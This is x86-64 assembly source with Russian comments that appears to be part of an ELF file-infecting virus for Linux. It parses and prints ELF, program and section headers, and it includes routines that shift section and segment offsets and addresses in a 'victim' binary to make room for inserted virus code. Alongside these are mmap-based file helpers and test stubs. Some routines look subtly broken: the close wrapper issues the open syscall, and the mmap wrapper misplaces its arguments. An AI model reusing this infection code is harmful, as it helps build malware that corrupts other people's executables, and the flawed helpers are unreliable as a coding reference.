elf_header_virus:
    .space 0x40,0

    .globl  read_elf_header
	.type	read_elf_header, @function

read_elf_header:
    push    %rbx
    push    %rdx

    mov     $0x1, %rdx
    mov     $0x40, %rbx

    call    fread

    pop     %rdx
    pop     %rbx

    ret

    # читает заголовок пргграммы из памяти
    # в rsi принимает указатель на память, в которой лежит эльф, смещенный до начала
    # таблицы заголовков программы, в rdi - указатель на место под записья
program_header:
    .space 0x38,0

    .globl  read_program_header
	.type	read_program_header, @function

read_program_header:
    push %rbx
    push %rdx

    mov  $0x1, %rdx
    mov  $0x38, %rbx

    call fread

    pop  %rdx
    pop  %rbx

    ret

    # принимает в edi указатель на структуру заголовка программы и выводит его поля

    .globl  print_program_header
	.type	print_program_header, @function

print_program_header:

    push    %rsi
    push    %rdx
    push    %rcx
    push    %r8

    mov     %rdi, %rcx

	movl	(%rcx), %esi
    mov     $p_type_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xE, %r8
    call	my_printf

    add     $0x4, %rcx

    movl	(%rcx), %esi
    mov     $p_flags_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x4, %rcx

    mov 	(%rcx), %rsi
    mov     $p_offset_msg, %rdi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $p_vaddr_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $p_paddr_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $p_filesz_msg, %rdi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $p_memsz_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $p_align_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    pop     %r8
    pop     %rcx
    pop     %rdx
    pop     %rsi

    ret

test_read_program_header:

    mov     $file_name3, %rdi
    O_RDONLY  %rsi
    call    fopen

    cmp     $0, %rax

    jle     test_read_program_header_end

    mov     %rax, %rdi
    mov     %rdi,  %rsi

    ELF_E_PHOFF %rdi, %rcx
    add     %rcx, %rsi
    mov     $program_header, %rdi
    call    read_program_header

    mov     $program_header, %rdi
    call    print_program_header

test_read_program_header_end:
    ret

    # читает все заголовки програм
    # принимает в rdi адрес, по которому должны быть записаны заголовки
    # в rsi - адрес, по которому лежат заголвки в памяти
    # в rdx - количество заголовков
    .globl  read_all_program_headers
	.type	read_all_program_headers, @function

read_all_program_headers:

    push    %rbp
    mov     %rsp, %rbp

    push    %rcx
    mov     %rdx, %rcx
read_all_program_headers_cycle:

    call    read_program_header

    loop    read_all_program_headers_cycle
    pop     %rcx

    pop     %rbp
    ret

    # принимает в rdi aдрес, по которому лежат заголовки
    # в rsi - их количество

    .globl  print_all_program_headers
	.type	print_all_program_headers, @function

print_all_program_headers:

    push    %rbp
    mov     %rsp, %rbp

    push    %rcx
    push    %r8
    push    %rdx
    push    %rax

    mov     %rsi, %rcx

print_all_program_headers_cycle:

    mov     %rdi, %rax

    call    print_program_header

    mov     $next_str, %rdi
    mov     $0x0, %rdx
    mov     $0x1, %r8

    call    my_printf

    mov     %rax, %rdi
    add     $0x38, %rdi

    loop    print_all_program_headers_cycle

    pop     %rax
    pop     %rdx
    pop     %r8
    pop     %rcx

    pop     %rbp
    ret

test_read_all_program_headers:
    push    %rbp
    mov     %rsp, %rbp

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_read_all_program_headers_end

    mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
    mov     %rax, %rsi

    ELF_E_PHOFF %rdi, %rcx
    add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

    ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
    movl    (%rax), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rdx

    mov     $0x38, %rax
    imul     %rcx,  %rax

    add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
    sub     %rax,  %rsp

    lea     (%rsp),  %rdi

    call    read_all_program_headers

    lea     (%rsp),  %rdi
    mov     %rcx, %rsi

    call    print_all_program_headers
    add     %rax,  %rsp

test_read_all_program_headers_end:
    pop %rbp
    ret

    # пересчитывает смещения и адреса секций, которые будут находиться после
    #  вставленного в жертву вируса
    # т.е. если вирус вставляется после тысячного байта в эльф-жертву, то все,
    # что находится после него, должно быть смещено на размер кода вируса.
    # поэтому мы будем пересчитывать адреса и смещения для всех секций, которые
    # находятся после той точки, кда вставлялся вирус и менять заголовки секций
    # ( менять заголовки программ не придется, поскольку вирус вставляется после
    #   последнего сегмента кода )

    # принимает в rdi  указатель на заголовки,
    # в rsi - их количество, в rdx - адрес, по которому будет записан вирус,
    # в rcx - сколько байт занимает вирус

    .globl  shdr_offset_and_addr_recount
    .type	shdr_offset_and_addr_recount, @function

recount_msg:
    .string "after recount: \n"

shdr_offset_and_addr_recount:

    push  %r8

    mov   %rcx, %r8
    mov   %rsi, %rcx        # установили счетчик цикла

shdr_offset_and_addr_recount_cycle:

    add   $0x18, %rdi

    cmp   %rdx,  (%rdi)

    jl    next_iter_recount

    add   %r8, (%rdi)   # пересчитываем адрес и смещение

    sub   $8, %rdi

    cmp   $0, (%rdi)
    jle   mov_addr_to_offset_field

    add   %r8, (%rdi)

mov_addr_to_offset_field:

    add   $8, %rdi

next_iter_recount:
    add   $0x28, %rdi

    loop shdr_offset_and_addr_recount_cycle
    pop  %r8

    ret

test_shdr_offset_and_addr_recount:

    push    %rbp
    mov     %rsp, %rbp

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_shdr_offset_and_addr_recount_end

    mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
    mov     %rax, %rsi

    ELF_E_SHOFF %rdi, %rcx
    add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

    ELF_E_SHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
    movl    (%rax), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rdx

    mov     $0x40, %rax
    imul     %rcx,  %rax

    add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
    sub     %rax,  %rsp

    lea     (%rsp),  %rdi

    call    read_all_section_headers

    lea     (%rsp),  %rdi
    mov     %rcx, %rsi

    call    print_all_section_headers

    mov     %rcx, %r9

    lea     (%rsp),  %rdi
    mov     %rcx, %rsi
    mov     $0xe10, %rdx
    mov     $0x3e8, %rcx

    call    shdr_offset_and_addr_recount

    mov     $recount_msg,%rdi
    mov     $0x0, %rsi
    mov     $0x0, %rdx
    mov     $0x10, %r8
    call    my_printf

    lea     (%rsp), %rdi
    mov     %r9, %rsi
    call    print_all_section_headers

    add     %rax,  %rsp

test_shdr_offset_and_addr_recount_end:
    pop %rbp

    ret

    # принимает в rdi  указатель на заголовки,
    # в rsi - их количество, в rdx - адрес, по которому будет записан вирус,
    # в rcx - сколько байт занимает вирус
phdr_offset_and_addr_recount:

    push  %r8

    mov   %rcx, %r8
    mov   %rsi, %rcx        # установили счетчик цикла

phdr_offset_and_addr_recount_cycle:

    add   $0x10, %rdi    # проверяем адрес

    cmp   %rdx,  (%rdi)  # если сегмент находится до точки записи вируса
    jl    next_iter_recount_phdr  #  пропускаем заголовок

    add   %r8, (%rdi)   # иначе пересчитываем vaddr и paddr
    add   $0x8, %rdi
    add   %r8, (%rdi)

    sub   $0x10, %rdi  # сдвигаем указатель на смещение

add_offset_phdr2:
    cmp   $0x0, (%rdi)  # сли ноль, то не редактируем
    jle   mov_addr_to_offset_field_phdr

    add   %r8, (%rdi)

mov_addr_to_offset_field_phdr:

    add   $0x8, %rdi

next_iter_recount_phdr:
    add   $0x28, %rdi
    loop phdr_offset_and_addr_recount_cycle

    pop  %r8

    ret

test_phdr_offset_and_addr_recount:
    push    %rbp
    mov     %rsp, %rbp

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_phdr_offset_and_addr_recount_end

    mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
    mov     %rax, %rsi

    ELF_E_PHOFF %rdi, %rcx
    add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

    ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
    movl    (%rax), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rdx

    mov     $0x40, %rax
    imul     %rcx,  %rax

    add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
    sub     %rax,  %rsp

    lea     (%rsp),  %rdi

    call    read_all_program_headers

    lea     (%rsp),  %rdi
    mov     %rcx, %rsi

    call    print_all_program_headers

    mov     %rcx, %r9

    lea     (%rsp),  %rdi
    mov     %rcx, %rsi
    mov     $0x400040, %rdx
    mov     $0x10, %rcx

    call    phdr_offset_and_addr_recount

    mov     $recount_msg,%rdi
    mov     $0x0, %rsi
    mov     $0x0, %rdx
    mov     $0x10, %r8
    call    my_printf

    lea     (%rsp), %rdi
    mov     %r9, %rsi
    call    print_all_program_headers

    add     %rax,  %rsp

test_phdr_offset_and_addr_recount_end:
    pop  %rbp

    ret


    # читает заголовок секции из памяти
    # в rsi принимает указатель на память, в которой лежит эльф, смещенный до начала
    # таблицы заголовков секций, в rdi - указательн на память, куда будет записан
    # заголовок
section_header:
    .space 0x40, 0

    .globl  read_section_header
	.type	read_section_header, @function

read_section_header:
    push %rbx
    push %rdx

    mov  $0x1, %rdx
    mov  $0x40, %rbx

    call fread

    pop  %rdx
    pop  %rbx

    ret
    # принимает в rdi указатель на структуру заголовка секции
    # печатает все поля секции
print_section_header:

    push    %rsi
    push    %rdx
    push    %rcx
    push    %r8

    mov     %rdi, %rcx

	movl	(%rcx), %esi
    mov     $sh_name_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x4, %rcx

    movl	(%rcx), %esi
    mov     $sh_type_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x4, %rcx

    movl	(%rcx), %esi
    mov     $sh_flags_msg, %rdi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $sh_addr_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $sh_offset_msg, %rdi
    mov     $0x10, %rdx
    mov     $0x11, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $sh_size_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x8, %rcx

    mov 	(%rcx), %rsi
    mov     $sh_link_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x4, %rcx

    mov 	(%rcx), %rsi
    mov     $sh_info_msg, %rdi
    mov     $0x10, %rdx
    mov     $0xF, %r8
    call	my_printf

    add     $0x4, %rcx

    movl 	(%rcx), %esi
    mov     $sh_addralign_msg, %rdi
    mov     $0x10, %rdx
    mov     $0x14, %r8
    call	my_printf

    add     $0x8, %rcx

    movl 	(%rcx), %esi
    mov     $sh_entsize_msg, %rdi
    mov     $0x10, %rdx
    mov     $0x12, %r8
    call	my_printf

    pop     %r8
    pop     %rcx
    pop     %rdx
    pop     %rsi

    ret
test_read_section_header:

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax

    jle     test_read_section_header_end

    mov     %rax, %rdi
    mov     %rdi,  %rsi

    ELF_E_SHOFF %rdi, %rcx
    add     %rcx, %rsi
    mov     $section_header, %rdi
    call    read_section_header

    mov     $section_header, %rdi
    call    print_section_header
test_read_section_header_end:
    ret

    # читает все заголовки секций
    # принимает в rdi адрес, по которому должны быть записаны заголовки
    # в rsi - адрес, по которому лежат заголвки в памяти
    # в rdx - количество заголовков
    .globl  read_all_section_headers
	.type	read_all_section_headers, @function

read_all_section_headers:

    push    %rbp
    mov     %rsp, %rbp

    push    %rcx
    mov     %rdx, %rcx
read_all_section_headers_cycle:

    call    read_section_header

    loop    read_all_section_headers_cycle
    pop     %rcx

    pop     %rbp
    ret

    # принимает в rdi aдрес, по которому лежат заголовки
    # в rsi - их количество

    .globl  print_all_section_headers
	.type	print_all_section_headers, @function

print_all_section_headers:

    push    %rbp
    mov     %rsp, %rbp

    push    %rcx
    push    %r8
    push    %rdx
    push    %rax

    mov     %rsi, %rcx

print_all_section_headers_cycle:

    mov     %rdi, %rax

    call    print_section_header

    mov     $next_str, %rdi
    mov     $0x0, %rdx
    mov     $0x1, %r8

    call    my_printf

    mov     %rax, %rdi
    add     $0x40, %rdi

    loop    print_all_section_headers_cycle

    pop     %rax
    pop     %rdx
    pop     %r8
    pop     %rcx

    pop     %rbp
    ret

test_read_all_section_headers:
    push    %rbp
    mov     %rsp, %rbp

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_read_all_section_headers_end

    mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
    mov     %rax, %rsi

    ELF_E_SHOFF %rdi, %rcx
    add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

    ELF_E_SHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
    movl    (%rax), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rdx

    mov     $0x40, %rax
    imul     %rcx,  %rax

    add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
    sub     %rax,  %rsp

    lea     (%rsp),  %rdi

    call    read_all_section_headers

    lea     (%rsp),  %rdi
    mov     %rcx, %rsi

    call    print_all_section_headers
    add     %rax,  %rsp

test_read_all_section_headers_end:
    pop %rbp
    ret

    # принимает указатель на структуру заголовка эльфа и выводит все его поля
    .globl  print_elf_header
	.type	print_elf_header, @function

    # принимает в rdi указатель на структуру эльф-хедера
print_elf_header:
    push    %rbp
    mov     %rsp, %rbp

    push    %rsi
    push    %rdx
    push    %rcx
    push    %r8

    add     $0x10, %rdi
    mov     %rdi, %rcx

    mov     $e_type_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx,  %edx
    mov     %edx,  %esi
    mov     $0x10, %rdx
    mov     $0xf, %r8
    call    my_printf

    add     $0x2, %rcx

    mov     $e_machine_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx,  %edx
    mov     %edx,  %esi
    mov     $0x10, %rdx
    mov     $0x12, %r8
    call    my_printf

    add     $0x2, %rcx

    mov     $e_version_msg, %rdi
    movzwl  (%rcx), %esi
    mov     $0x10, %rdx
    mov     $0x12, %r8
    call    my_printf

    add     $0x4, %rcx

    mov     $e_entry_msg, %rdi
    movzwl  (%rcx), %esi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call    my_printf

    add     $0x8, %rcx

    mov     $e_phoff_msg, %rdi
    mov     (%rcx), %rsi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call    my_printf

    add     $0x8, %rcx

    mov     $e_shoff_msg, %rdi
    mov     (%rcx), %rsi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call    my_printf

    add     $0x8, %rcx

    mov     $e_ehsize_msg, %rdi
    movl    (%rcx), %esi
    mov     $0x10, %rdx
    mov     $0x11, %r8
    call    my_printf

    add     $4, %rcx

    mov     $e_flags_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx, %esi
    mov     $0x10, %rdx
    mov     $0xf, %r8
    call    my_printf

    add     $2, %rcx

    mov     $e_phentsize_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx, %esi
    mov     $0x10, %rdx
    mov     $0x14, %r8
    call    my_printf

    add     $2, %rcx

    mov     $e_phnum_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx, %esi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call    my_printf

    add     $2, %rcx

    mov     $e_shentsize_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx, %esi
    mov     $0x10, %rdx
    mov     $0x14, %r8
    call    my_printf

    add     $2, %rcx

    mov     $e_shnum_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx, %esi
    mov     $0x10, %rdx
    mov     $0x10, %r8
    call    my_printf

    add     $2, %rcx

    mov     $e_shstrndx_msg, %rdi
    movzwl  (%rcx), %edx
    movzwl  %dx, %esi
    mov     $0x10, %rdx
    mov     $0x13, %r8
    call    my_printf

    pop     %r8
    pop     %rcx
    pop     %rdx
    pop     %rsi

    pop     %rbp
    ret

test_read_elf_header:

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_read_elf_header_end
    mov     %rax, %rsi
    mov     %rax, %rdx
    mov     $elf_header_victim, %rdi
    call    read_elf_header

    mov     $elf_header_victim, %rdi
    call    print_elf_header

    mov     %rdx, %rdi
    call    close
test_read_elf_header_end:
    ret

    # конвертирует число в строку для вывода числа в шеcтнадцатеричном формате
    # принимает в rsi адрес на массив, в котором записано число
converted_addr:
    .space 0x11, 0

    .globl  cnvrt_num_to_hex_string
	.type	cnvrt_num_to_hex_string, @function
    #.param  ptr_array_num, gr # %rsi

cnvrt_num_to_hex_string:
    push    %rax
    push    %rsi
    push    %rdi
    push    %rcx
    push    %rdx

    mov     $converted_addr, %rdi

    add     $0x10, %rdi
    movb    $0xA,  (%rdi)

    mov     $converted_addr, %rdi

    mov     $0x10, %rcx

cnvrt_num_cycle:

    xor     %rax, %rax
    movb    (%rsi), %al
    cmp     $0x09, %rax
    jg      cnvrt_in_letter

    add     $0x30,  %al    # конвертируем в числовое представление
    jmp     continue_cycle

cnvrt_in_letter:
    add     $0x57, %al    # конвертируем в буквенное представление

continue_cycle:
    movb    %al, (%rdi)

    inc     %rsi
    inc     %rdi
    loop    cnvrt_num_cycle

cnvrt_num_end:
    popq    %rdx
    popq    %rcx
    popq    %rdi
    popq    %rsi
    popq    %rax

	ret

test_cnvrt_num_to_hex_string:

    pushq   %rbp
	movq    %rsp, %rbp

    mov     $byted_addr, %rdi
    mov     $0x10, %rsi

    call    clear_array
    mov     $byted_addr, %rsi

    movb    $0x01, (%rsi)

    call    cnvrt_num_to_hex_string

    mov     $0x0, %rdi
    mov     $converted_addr, %rsi
    mov     $0x11, %rdx
    call    write

    popq    %rbp
	ret

 # принимает в rdi адрес массив, в rsi - его размер, заполняет массив нулями
clear_array:
    pushq   %rbp
	movq    %rsp, %rbp

    push    %rcx
    mov     %rsi, %rcx

clear_array_cycle:
    movb    $0x0, (%rdi)
    inc     %rdi
    loop    clear_array_cycle

clear_array_end:

    pop     %rcx
    popq    %rbp
	ret

    # принимает в rdi строку, которую нужно вывести,
    # в rsi - число для вывода
    # в rdx - основание системы счисления, в которой надо вывести число
    # или 0, если вывода числа нет,
    # в r8 - размер строки, если она есть
my_printf:
    push    %rcx
    push    %rax
    push    %rdx

    mov     %rdi, %rcx
    mov     %rsi, %rax

    cmp     $0, %rdx
    je      print_string

    cmp     $16, %rdx
    je      cnvrt_hex_num

    jmp     print_string

cnvrt_hex_num:
    mov     $byted_addr, %rdi   # очищаем массив (там могло быть другое число)
    mov     $0x10, %rsi

    call    clear_array

    mov     $converted_addr, %rdi
    mov     $0x11, %rsi

    call    clear_array

    mov     %rax, %rdi               # забираем число со стека
    call    cnvrt_addr_in_16_byte

    mov     $byted_addr, %rsi
    call    cnvrt_num_to_hex_string   # преобразовываем в строку

print_string:
    mov     %rcx, %rsi # забрали строку

    cmp     $0, %rsi
    je      print_num

    mov     $0, %rdi

    mov     %r8, %rdx
    call    write

print_num:
    pop     %rdx      # забрали снование системы счисления
    cmp     $0, %rdx
    je      my_printf_end

    xor     %rdi, %rdi
    mov     $converted_addr, %rsi
    mov     $0x11, %rdx

    call    write

my_printf_end:
    pop     %rax
    pop     %rcx
	ret

test_my_printf1:
    mov     $msg, %rdi
    mov     $0x3041d23e2, %rsi
    mov     $0x10, %rdx
    mov     $0x13, %r8

    call    my_printf
	ret

test_my_printf2:
    mov     $0x0, %rdi
    mov     $0x3041d23e2, %rsi
    mov     $0x10, %rdx
    mov     $0x0, %r8

    call    my_printf

    ret

test_my_printf3:

    mov     $msg, %rdi
    mov     $0x0, %rsi
    mov     $0x0, %rdx
    mov     $0x13, %r8

    call    my_printf
	ret

    # принимает в rdi адрес/число, который нужно конвертировать из 8 байт в 16
    # на выходе получаем то же самое число, но каждые полбайта записаны в целый байт
byted_addr:
    .space  20, 0

cnvrt_addr_in_16_byte:
    push    %r8
    push    %r9
    push    %rax
    push    %rcx
    push    %rdx
    push    %rbx
    push    %rsi

    mov     %rdi, %rdx
    mov     $byted_addr, %rsi

    add     $0xF, %rsi
    mov     $0x10, %rcx

    mov     $0x0, %r8

    ADDR_MASQUE %rbx

cnvrt_addr_cycle:

    and     %rbx, %rdx

    mov     %rcx, %r9
    xor     %rcx, %rcx

mov_num_cycle:
    cmp     %r8, %rcx
    jge     mov_num_end

    shr     $0x4, %rdx
    inc     %rcx
    jmp     mov_num_cycle

mov_num_end:
    mov     %r9, %rcx
    movb    %dl, (%rsi)

    mov     %rdi, %rdx
    shl     $0x4, %rbx

    dec     %rsi
    inc     %r8

    loop   cnvrt_addr_cycle

    pop     %rsi
    pop     %rbx
    pop     %rdx
    pop     %rcx
    pop     %rax
    pop     %r9
    pop     %r8

    ret

test_cnvrt_addr_in_16_byte:
    pushq   %rbp
	movq    %rsp, %rbp

    mov     $0x40, %rdi
    call    cnvrt_addr_in_16_byte

    mov     $byted_addr, %rsi
    call    cnvrt_num_to_hex_string

    mov     $0, %rdi
    mov     $converted_addr, %rsi
    mov     $0x11, %rdx

    call    write

    popq    %rbp
	ret

test_open:
    pushq   %rbp
	movq    %rsp, %rbp

    push    %rdi
    push    %rax
    push    %rsi


    mov     $file_name, %rdi
    O_RDONLY %rsi
    call    open

    pop    %rsi
    pop    %rax
    pop    %rdi

    popq    %rbp
	ret

test_write:
    pushq   %rbp
	movq    %rsp, %rbp

    push    %rdi
    push    %rax
    push    %rsi
    push    %rdx

    mov     $file_name, %rdi
    O_RDWR  %rsi

    call    open

    push    %rax
    mov     %rax, %rdi
    mov     $msg, %rsi
    mov     $19, %rdx

    call    write

    pop     %rdi
    call    close

    pop     %rdx
    pop     %rsi
    pop     %rax
    pop     %rdi

    popq    %rbp
	ret

test_fwrite:
    pushq   %rbp
	movq    %rsp, %rbp

    mov     $array, %rdi
    mov     $msg, %rsi
    mov     $19, %rdx

    call    fwrite

    mov     %rax, %rdi
    mov     $msg2, %rsi
    mov     $20, %rdx
    call    fwrite

    mov     $0, %rdi
    mov     $array, %rsi
    mov     $39, %rdx

    call    write
    popq    %rbp
	ret

# цель теста смаппить содержимое файла в память и вывести из памяти в stdout
test_fopen:

    push    %rdi
    push    %rax
    push    %rsi
    push    %rdx

    mov     $file_name, %rdi
    O_RDWR  %rsi
    call    fopen

    mov     $0, %rdi
    mov     %rax, %rsi
    mov     $19, %rdx

    call    write

    pop     %rdx
    pop     %rsi
    pop     %rax
    pop     %rdi

	ret

# цель теста скопировать строку в массив и вывести ее оттуда в stdout
test_memcpy:
    pushq   %rbp
	movq    %rsp, %rbp

    subq	$32, %rsp

    movq 	$array, %rdi
	movq	$msg, %rsi
    mov     $19, %rdx

    call    memcpy

    mov     $0, %rdi
    mov     $array, %rsi
    mov     $19, %rdx

    call    write
    add     $32, %rsp
    popq    %rbp
	ret

# цель теста:
# смаппить содержимое file_name в память, прочитать  данные из памяти в массив
# записать их в file_name2
test_fread:

    mov     $file_name, %rdi
    O_RDWR  %rsi

    call    fopen

    cmp     $0, %rax
    jle     test_fread_end

    mov     $array, %rdi  # читаем в массив
    mov     %rax, %rsi
    mov     $1, %rdx
    mov     $19, %rbx

    call    fread

    mov     $file_name2, %rdi
    O_RDWR  %rsi

    call    open

    push    %rax  # сохранили дескриптор на открытый файл

    mov     %rax, %rdi
    mov     $array, %rsi
    mov     $19, %rdx

    call    write

    pop     %rdi
    call    close

test_fread_end:
	ret

# принимает в rdi имя файла
# в rsi - флаги
open:
    pushq   %rbp
	movq    %rsp, %rbp

    mov     $2, %rax
    syscall

    popq    %rbp
	ret

#   принимает в rdi адрес,  по которому пишем
#   в rsi длину считываемого файла
#   в rdx - права на доступ к памяти
#   в rcx - флаги
#   в r8 - дескриптор файла, из которого читаем
#   в r9 - смещение от начала файла, из которого читаем
mmap:

    pushq   %rbp
	movq    %rsp, %rbp

    push %rbx
	push %rcx
	push %rdx
	push %rbp
	push %r10
	push %r14
	push %r15

	mov %r9, %r15
	mov %rsi, %r13
	mov %rdi, %r12
	mov %ecx, %r14d

	movslq %r8d, %rbp
	movslq %edx, %rbx
	movslq %r14d, %r10
	mov $0x9, %eax

	syscall

	pop %r15
	pop %r14
	pop %r10
	pop %rbp
	pop %rdx
	pop %rcx
	pop %rbx

    popq    %rbp
	ret

# принимает в rdi указатель на назначение
# в rsi - указатель на источник
# в rdx - размер байт, которые надо записать
memcpy:

    pushq   %rbp
	movq    %rsp, %rbp

    pushq    %rcx
    pushq    %rax

    movq     %rdx, %rcx   # устанавливаем счетчик цикла

cycle_memcpy:

    movq	%rsi, %rax
    movzbl	(%rax), %edx

	movq	%rdi, %rax
	movb	%dl, (%rax)

    inc      %rdi       # инкрементируем оба указателя
    inc      %rsi

    loop     cycle_memcpy

memcpy_end:
    popq     %rax
    popq     %rcx

    popq     %rbp
    ret

# принимает в rdi имя файла
# в rsi - указатель на структуру типа stat
stat:
    mov     $0x04, %rax
    syscall

   	ret

# принимает в rdi имя файла,
# в rsi - флаги
fopen:
    push    %rbp
    mov     %rsp, %rbp

    call    open
    cmp     $0, %rax
    jle     fopen_end3

    sub     $200, %rsp

    push    %rsi    # сохранили флаги
    push    %rax    # сохранили дескриптор

    leaq    -160(%rbp), %rsi  # грузим указатель на структуру

    call    stat

    cmp     $0, %rax
    jl      fopen_end2

    pop     %rax    # восстановили дескриптор
    pop     %rsi    #восстановили флаги

    push    %rbx  # сохраняем регистры на всякий случай
    push    %rcx
    push    %rdx
    push    %r10
    push    %r9
    push    %r8

    mov     %rax, %r8           # занесли дескриптор файла
    mov     %rsi, %rax          # сохранили флаги
    mov     $0, %rdi            # установили адрес для записи (значение по умолчанию)

    MAP_PRIVATE %r10            # занесли флаг для mmap

    mov    -112(%rbp), %rsi     # занесли размер файла
    movq     $0, %r9            # занесли смещение

    O_RDONLY %rcx  # если файл был открыт на чтение

    cmp     %rcx,  %rax
    je      mmap_rdonly

    O_RDWR  %rcx           # если файл был открыт на запись и чтение
    cmp     %rcx,  %rax

    je      mmap_rdwr

mmap_none:

    PROT_NONE %rdx   # занесли права на доступ к памяти
    mov     $2, %rcx
    call    mmap               # указатель на выделенную память окажется в %rax
    jmp     fopen_end

mmap_rdwr:

    PROT_READ_OR_PROT_WRITE %rdx   # занесли права на доступ к памяти
    mov     $2, %rcx

    call    mmap                      # указатель на выделенную память окажется в %rax
    jmp     fopen_end

mmap_rdonly:
    PROT_READ %rdx   # занесли права на доступ к памяти
    mov     $2, %rcx

    call    mmap               # указатель на выделенную память окажется в %rax

fopen_end:

    pop     %r8
    pop     %r9
    pop     %r10
    pop     %rdx
    pop     %rcx
    pop     %rbx

    jmp     fopen_end3
fopen_end2:
    pop     %rsi
    pop     %rsi

fopen_end3:

    add     $200, %rsp
    pop     %rbp
	ret

# принимает в rdi на назначние
# в rsi - на источник
# в rdx - на кол-во итераций записи
# в rbx - на кол-во байт, которые надо считать за раз
fread:

    push    %rcx
    push    %rax

    movq    %rdx, %rcx   # устанавливаем счетчик цикла

cycle_fread:
    mov    %rbx, %rdx
    call    memcpy
    loop    cycle_fread

fread_end:
    pop     %rax
    popq    %rcx
	ret

# принимает в rdi дескриптор файла
close:
    mov     $0x2, %rax
    syscall

	ret

 # принимает в rdi дескриптор файла
 # в rsi - указатель на строку
 # в rdx - размер строки
write:

    mov     $0x1, %rax
    syscall

	ret

# принимает к rdi назначение
# в rsi - источник
# в rdx - кол-во байт, которое надо считать
# возвращает измененный указатель на назначение (назначение + кол-во записанных байт)
fwrite:

    pushq   %rbp
	movq    %rsp, %rbp

    call    memcpy

    mov     %rdi, %rax
    popq    %rbp
	ret
array:
    .space 40

stack_begin:
    .space 6000, 0
stack_end:
    call _count_memory
